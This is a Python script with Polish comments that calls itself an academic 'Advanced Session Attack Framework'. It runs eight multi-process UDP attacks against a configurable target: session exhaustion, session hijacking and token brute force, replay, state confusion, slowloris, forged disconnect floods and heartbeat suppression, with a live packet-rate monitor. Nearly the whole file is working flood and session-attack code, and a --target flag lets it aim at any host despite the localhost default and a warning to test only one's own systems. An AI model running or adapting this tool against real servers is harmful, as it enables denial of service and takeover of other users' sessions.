#!/usr/bin/env python3
"""
Advanced Session Attack Framework - Multi-Vector Exploitation
Zaawansowana analiza wektorów ataku na sesje Layer-7

Status: Kod Akademicki / Badawczy (Praca Magisterska)
Architektura: Multi-vector attack simulator z anomaly injection

WEKTORY ATAKU:
1. Session Exhaustion Attack      - Wyczerpanie puli sesji
2. Session Hijacking Attempt      - Próba przejęcia sesji
3. Replay Attack                  - Powtarzanie ważnych pakietów
4. Token Brute Force              - Atakowanie tokenów
5. State Confusion Attack         - Wysyłanie pakietów w złej kolejności
6. Slowloris DoS                  - Wolne, ciągnące połączenia
7. Connection Reset (RST/FIN)     - Wymuszanie rozłączenia
8. Heartbeat Suppression          - Próba wyłączenia keep-alive

⚠️  OSTRZEŻENIE: TYLKO testów akademickich WŁASNYCH systemów!
"""

import os
import select
import signal
import socket
import sys
import time
import argparse
import multiprocessing
import json
import random
import string
from enum import Enum


class AttackType(Enum):
    """Rodzaje ataków"""

    SESSION_EXHAUSTION = "session_exhaustion"
    SESSION_HIJACKING = "session_hijacking"
    REPLAY_ATTACK = "replay_attack"
    TOKEN_BRUTEFORCE = "token_bruteforce"
    STATE_CONFUSION = "state_confusion"
    SLOWLORIS = "slowloris"
    CONNECTION_RESET = "connection_reset"
    HEARTBEAT_SUPPRESSION = "heartbeat_suppression"
    COMBINED = "combined"


# === KONFIGURACJA ===
TARGET_IP = "127.0.0.1"  # Zmienione na localhost - popraw jeśli inny IP!
TARGET_PORT = 16000  # Popraw jeśli inny port GameRangera
PAYLOAD_SIZE = 500
PROCESS_COUNT = min(max(1, os.cpu_count() or 1), 4)

# === ATTACK PARAMETERS ===
TOKENS_TO_BRUTEFORCE = 10000  # Ile tokenów spróbować
SESSION_POOL_SIZE = 1000  # Jak wiele sesji otworzyć
REPLAY_PACKET_COUNT = 100  # Ile razy powtórzyć pakiet
SLOWLORIS_DELAY = 0.1  # Opóźnienie na pakiet (sekundy)
STATE_CONFUSION_VARIANTS = 50  # Ile wariantów stanu wysłać
DEFAULT_SNDBUF = 256 * 1024


def configure_send_buffer(sock):
    """Konfiguracja bufora wysyłającego"""
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, DEFAULT_SNDBUF)
    except OSError:
        pass


def wait_until_writable(sock, timeout=0.01):
    """Non-blocking write wait"""
    try:
        _, writable, _ = select.select([], [sock], [], timeout)
        return bool(writable)
    except OSError:
        return False


def generate_fake_token(length=32):
    """Generuj random token"""
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


def generate_fake_session_id(length=16):
    """Generuj random session_id"""
    return "".join(random.choices(string.hex_digits, k=length))


def create_auth_packet(session_id=None, token=None, seq=1):
    """Stwórz pakiet z autoryzacją (imituje handshake)"""
    if session_id is None:
        session_id = generate_fake_session_id()
    if token is None:
        token = generate_fake_token()

    msg = {
        "type": "LOGIN",
        "session_id": session_id,
        "token": token,
        "seq": seq,
        "timestamp": int(time.time()),
    }
    return json.dumps(msg).encode("utf-8")[:PAYLOAD_SIZE]


def create_data_packet(session_id, token, seq, data="X"):
    """Stwórz pakiet danych"""
    msg = {
        "type": "DATA",
        "session_id": session_id,
        "token": token,
        "seq": seq,
        "data": data,
        "timestamp": int(time.time()),
    }
    return json.dumps(msg).encode("utf-8")[:PAYLOAD_SIZE]


def create_heartbeat_packet(session_id, token):
    """Stwórz heartbeat/keep-alive"""
    msg = {
        "type": "HEARTBEAT",
        "session_id": session_id,
        "token": token,
        "timestamp": int(time.time()),
    }
    return json.dumps(msg).encode("utf-8")[:PAYLOAD_SIZE]


def attack_session_exhaustion(
    worker_id, target_ip, target_port, stop_event, shared_stats, duration
):
    """
    ATAK 1: Session Exhaustion - MAKSYMALNY
    Otwiera tyle sesji ile się da - wyczerpuje pool sesji na serwerze
    """
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    configure_send_buffer(sock)

    target_addr = (target_ip, target_port)
    accumulated = 0
    start_time = time.perf_counter()
    last_flush = start_time

    while not stop_event.is_set():
        elapsed = time.perf_counter() - start_time
        if elapsed > duration:
            break

        # BURST: 100 sesji na iterację (szybko!)
        for _ in range(100):
            packet = create_auth_packet(session_id=generate_fake_session_id())
            try:
                sock.sendto(packet, target_addr)
                accumulated += 1
            except (BlockingIOError, OSError):
                pass

        # Flush co 10 pakietów LUB co 0.1s
        if accumulated >= 10 or (time.perf_counter() - last_flush > 0.1):
            if accumulated > 0:
                with shared_stats.get_lock():
                    shared_stats.value += accumulated
                accumulated = 0
            last_flush = time.perf_counter()

    # Final flush - OBOWIĄZKOWE!
    if accumulated > 0:
        with shared_stats.get_lock():
            shared_stats.value += accumulated
    sock.close()


def attack_session_hijacking(
    worker_id, target_ip, target_port, stop_event, shared_stats, duration
):
    """
    ATAK 2: Session Hijacking - MAKSYMALNY
    Próbuje przejąć istniejące sesje przez brute-forcing knownych session_id + losowych tokenów
    """
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    configure_send_buffer(sock)

    target_addr = (target_ip, target_port)
    accumulated = 0
    start_time = time.perf_counter()
    last_flush = start_time

    known_session_ids = [f"session_{i:04d}" for i in range(100)]

    while not stop_event.is_set():
        elapsed = time.perf_counter() - start_time
        if elapsed > duration:
            break

        # BURST: 50 kombinacji per iterację
        for session_id in known_session_ids[:50]:
            fake_token = generate_fake_token(8)
            packet = create_data_packet(
                session_id, fake_token, seq=random.randint(1, 100)
            )

            try:
                sock.sendto(packet, target_addr)
                accumulated += 1
            except (BlockingIOError, OSError):
                pass

        # Flush co 50 pakietów LUB co 0.1s
        if accumulated >= 50 or (time.perf_counter() - last_flush > 0.1):
            if accumulated > 0:
                with shared_stats.get_lock():
                    shared_stats.value += accumulated
                accumulated = 0
            last_flush = time.perf_counter()

    if accumulated > 0:
        with shared_stats.get_lock():
            shared_stats.value += accumulated
    sock.close()


def attack_replay(
    worker_id, target_ip, target_port, stop_event, shared_stats, duration
):
    """
    ATAK 3: Replay Attack
    Przechwytuje ważny pakiet i powtarza go wielokrotnie
    (imituje przechwycenie i replay prawidłowych danych)
    """
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    configure_send_buffer(sock)

    target_addr = (target_ip, target_port)
    accumulated = 0
    start_time = time.perf_counter()

    # Stwórz "przechwycony" ważny pakiet
    captured_packet = create_data_packet(
        "real_session", "real_token", seq=42, data="transfer_money:1000"
    )

    while not stop_event.is_set():
        if time.perf_counter() - start_time > duration:
            break

        # Powtarzaj ten sam pakiet wiele razy
        for _ in range(REPLAY_PACKET_COUNT):
            try:
                sock.sendto(captured_packet, target_addr)
                accumulated += 1
            except (BlockingIOError, OSError):
                pass

    if accumulated > 0:
        with shared_stats.get_lock():
            shared_stats.value += accumulated
    sock.close()


def attack_token_bruteforce(
    worker_id, target_ip, target_port, stop_event, shared_stats, duration
):
    """
    ATAK 4: Token Brute Force
    Próbuje zgadnąć prawidłowy token dla znanych sesji
    """
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    configure_send_buffer(sock)

    target_addr = (target_ip, target_port)
    accumulated = 0
    start_time = time.perf_counter()

    known_session = "admin_session"

    while not stop_event.is_set():
        if time.perf_counter() - start_time > duration:
            break

        # Systematycznie próbuj różne tokeny
        for i in range(TOKENS_TO_BRUTEFORCE):
            fake_token = f"token_{i:08d}"
            packet = create_data_packet(known_session, fake_token, seq=1)

            try:
                sock.sendto(packet, target_addr)
                accumulated += 1
            except (BlockingIOError, OSError):
                pass

    if accumulated > 0:
        with shared_stats.get_lock():
            shared_stats.value += accumulated
    sock.close()


def attack_state_confusion(
    worker_id, target_ip, target_port, stop_event, shared_stats, duration
):
    """
    ATAK 5: State Confusion
    Wysyła pakiety w złej kolejności, z innymi sekwencjami, zmieniającymi stan
    Celem jest wywarcie zamieszania w state machine serwera
    """
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    configure_send_buffer(sock)

    target_addr = (target_ip, target_port)
    accumulated = 0
    start_time = time.perf_counter()

    session_id = generate_fake_session_id()
    token = generate_fake_token()

    while not stop_event.is_set():
        if time.perf_counter() - start_time > duration:
            break

        # Wysyłaj pakiety z różnymi stanami
        for variant in range(STATE_CONFUSION_VARIANTS):
            # Niespodziewane skoki sekwencji
            seq = random.choice([1, 5, 100, 1000, -1, 0, 999999])

            # Różne typy pakietów w losowej kolejności
            packet_type = random.choice(
                [
                    create_auth_packet(session_id, token, seq),
                    create_data_packet(session_id, token, seq),
                    create_heartbeat_packet(session_id, token),
                ]
            )

            try:
                sock.sendto(packet_type, target_addr)
                accumulated += 1
            except (BlockingIOError, OSError):
                pass

    if accumulated > 0:
        with shared_stats.get_lock():
            shared_stats.value += accumulated
    sock.close()


def attack_slowloris(
    worker_id, target_ip, target_port, stop_event, shared_stats, duration
):
    """
    ATAK 6: Slowloris DoS (UDP variant)
    Wysyła pakiety bardzo wolno ale konsekwentnie - drain resources
    Symuluje wolne połączenia które zajmują sesję bez robienia nic
    """
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    configure_send_buffer(sock)

    target_addr = (target_ip, target_port)
    accumulated = 0
    start_time = time.perf_counter()

    session_id = generate_fake_session_id()
    token = generate_fake_token()
    seq = 0

    while not stop_event.is_set():
        if time.perf_counter() - start_time > duration:
            break

        # Wyślij jeden pakiet, czekaj, wyślij następny
        packet = create_heartbeat_packet(session_id, token)

        try:
            sock.sendto(packet, target_addr)
            accumulated += 1
        except (BlockingIOError, OSError):
            pass

        time.sleep(SLOWLORIS_DELAY)  # Celowo powoli!

    if accumulated > 0:
        with shared_stats.get_lock():
            shared_stats.value += accumulated
    sock.close()


def attack_connection_reset(
    worker_id, target_ip, target_port, stop_event, shared_stats, duration
):
    """
    ATAK 7: Connection Reset / Disconnect Flood
    Wysyła fałszywe pakiety rozłączenia (DISCONNECT) dla aktywnych sesji
    Próbuje wymusić zamknięcie sesji innych użytkowników
    """
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    configure_send_buffer(sock)

    target_addr = (target_ip, target_port)
    accumulated = 0
    start_time = time.perf_counter()

    while not stop_event.is_set():
        if time.perf_counter() - start_time > duration:
            break

        # Stwórz fałszywy DISCONNECT pakiet
        msg = {
            "type": "DISCONNECT",
            "session_id": generate_fake_session_id(),
            "reason": "client_initiated",
        }
        packet = json.dumps(msg).encode("utf-8")[:PAYLOAD_SIZE]

        try:
            sock.sendto(packet, target_addr)
            accumulated += 1
        except (BlockingIOError, OSError):
            pass

    if accumulated > 0:
        with shared_stats.get_lock():
            shared_stats.value += accumulated
    sock.close()


def attack_heartbeat_suppression(
    worker_id, target_ip, target_port, stop_event, shared_stats, duration
):
    """
    ATAK 8: Heartbeat Suppression
    Wysyła fałszywe pakiety HEARTBEAT_ACK aby oszukać serwer
    że sesja jest aktywna, ale nigdy nie wysyła danych
    Zależy to od implementacji, ale może prowadzić do resource exhaustion
    """
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    configure_send_buffer(sock)

    target_addr = (target_ip, target_port)
    accumulated = 0
    start_time = time.perf_counter()

    # Otwórz sesję
    session_id = generate_fake_session_id()
    token = generate_fake_token()

    while not stop_event.is_set():
        if time.perf_counter() - start_time > duration:
            break

        # Ciągle wysyłaj heartbeat żeby zajmować sesję bez robienia nic
        packet = create_heartbeat_packet(session_id, token)

        try:
            sock.sendto(packet, target_addr)
            accumulated += 1
        except (BlockingIOError, OSError):
            pass

        time.sleep(0.01)  # Co 10ms heartbeat

    if accumulated > 0:
        with shared_stats.get_lock():
            shared_stats.value += accumulated
    sock.close()


def monitor(attack_type, shared_stats, stop_event, duration):
    """Monitor z live statystykami"""
    last_count = 0
    start_telemetry_time = time.time()

    print(f"\n[DEBUG] Monitor uruchomiony dla: {attack_type.value}")
    print(f"[DEBUG] Wysyłanie do: {TARGET_IP}:{TARGET_PORT}")

    while not stop_event.is_set():
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            break

        with shared_stats.get_lock():
            current_total = shared_stats.value

        pps = current_total - last_count
        mbps = (pps * (PAYLOAD_SIZE + 66) * 8) / 1_000_000
        last_count = current_total
        elapsed_total = time.time() - start_telemetry_time
        remaining = duration - elapsed_total

        os.system("cls" if os.name == "nt" else "clear")
        print("=" * 70)
        print(f"  ADVANCED SESSION ATTACK - {attack_type.value.upper()}")
        print("=" * 70)
        print(f"Target                       : {TARGET_IP}:{TARGET_PORT}")
        print(f"Workers                      : {PROCESS_COUNT}")
        print("-" * 70)
        print(f"Current PPS (Last 1sec)      : {pps:,} packets/sec ✅")
        print(f"Bandwidth                    : {mbps:.2f} Mbps 📊")
        print(f"Total Packets Sent           : {current_total:,} 📦")
        print(
            f"Total Data Sent              : {(current_total * PAYLOAD_SIZE) / 1024 / 1024:.2f} MB 💾"
        )
        print(f"Time: {elapsed_total:.1f}s / Remaining: {remaining:.1f}s ⏱️")
        print("-" * 70)
        print(f"Attack Vector: {attack_type.value}")
        print("\n💡 Obserwuj na serwerze (continuous_protocol_test.py):")
        print("   - Valid sessions (czy pakiety trafiają)")
        print("   - Anomalies detected (czy ataki działają)")
        print("   - Bandwidth usage")
        print("=" * 70)


def parse_args():
    """Parse arguments"""
    parser = argparse.ArgumentParser(
        description="Advanced Session Attack Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ataki dostępne:
  1. session_exhaustion    - Wyczerpanie puli sesji
  2. session_hijacking     - Próba przejęcia sesji
  3. replay_attack         - Powtarzanie pakietów
  4. token_bruteforce      - Brute force tokenów
  5. state_confusion       - Zamieszanie w state machine
  6. slowloris             - DoS z wolnymi pakietami
  7. connection_reset      - Wymuszanie rozłączenia
  8. heartbeat_suppression - Supresja heartbeat
  9. combined              - Wszystkie ataki naraz

Przykłady:
  python advanced_session_attack.py --attack session_exhaustion --duration 60
  python advanced_session_attack.py --attack combined --duration 120 --workers 8
""",
    )

    parser.add_argument(
        "--attack",
        choices=[a.value for a in AttackType],
        default="combined",
        help="Typ ataku",
    )
    parser.add_argument("--target", default=TARGET_IP, help="Target IP")
    parser.add_argument("--port", type=int, default=TARGET_PORT, help="Target port")
    parser.add_argument(
        "--duration", type=int, default=60, help="Czas trwania (sekundy)"
    )
    parser.add_argument(
        "--workers", type=int, default=PROCESS_COUNT, help="Liczba workerów"
    )
    parser.add_argument("--yes", action="store_true", help="Pomiń potwierdzenie")

    return parser.parse_args()


def main():
    """Main"""
    args = parse_args()

    print(
        """
╔══════════════════════════════════════════════════════════════════════╗
║  ADVANCED SESSION ATTACK FRAMEWORK - AKADEMICKIE TESTOWANIE          ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  ⚠️  OSTRZEŻENIE: TYLKO TESTÓW WŁASNYCH SYSTEMÓW                    ║
║                                                                      ║
║  8 Zaawansowanych Wektorów Ataku na Layer-7:                        ║
║  ✓ Session Exhaustion  ✓ Session Hijacking  ✓ Replay Attacks        ║
║  ✓ Token Brute Force   ✓ State Confusion    ✓ Slowloris             ║
║  ✓ Connection Reset    ✓ Heartbeat Suppression                      ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""
    )

    if not args.yes:
        response = (
            input(
                f"Uruchomić atak '{args.attack}' na {args.target}:{args.port}? (y/n): "
            )
            .strip()
            .lower()
        )
        if response != "y":
            sys.exit(0)

    # Mapowanie ataków
    attack_map = {
        "session_exhaustion": attack_session_exhaustion,
        "session_hijacking": attack_session_hijacking,
        "replay_attack": attack_replay,
        "token_bruteforce": attack_token_bruteforce,
        "state_confusion": attack_state_confusion,
        "slowloris": attack_slowloris,
        "connection_reset": attack_connection_reset,
        "heartbeat_suppression": attack_heartbeat_suppression,
    }

    print(f"\n🔥 Uruchamianie ataku: {args.attack.upper()}")

    total_packets = multiprocessing.Value("Q", 0)
    stop_event = multiprocessing.Event()

    attack_type = AttackType(args.attack)

    if args.attack == "combined":
        # Uruchom wiele ataków jednocześnie
        workers = []
        for attack_name, attack_func in attack_map.items():
            for i in range(max(1, args.workers // 8)):
                p = multiprocessing.Process(
                    target=attack_func,
                    args=(
                        i,
                        args.target,
                        args.port,
                        stop_event,
                        total_packets,
                        args.duration,
                    ),
                )
                p.daemon = True
                p.start()
                workers.append(p)
    else:
        # Uruchom wybrany atak
        attack_func = attack_map[args.attack]
        workers = []
        for i in range(args.workers):
            p = multiprocessing.Process(
                target=attack_func,
                args=(
                    i,
                    args.target,
                    args.port,
                    stop_event,
                    total_packets,
                    args.duration,
                ),
            )
            p.daemon = True
            p.start()
            workers.append(p)

    try:
        monitor(attack_type, total_packets, stop_event, args.duration)
    except KeyboardInterrupt:
        print("\n[-] Stopping...")
    finally:
        stop_event.set()

        for w in workers:
            if w.is_alive():
                w.terminate()
                w.join()

        with total_packets.get_lock():
            final = total_packets.value

        print(f"\n{'='*70}")
        print("✅ Attack completed!")
        print(f"Total packets sent: {final:,}")
        print(f"{'='*70}\n")


if __name__ == "__main__":
    main()
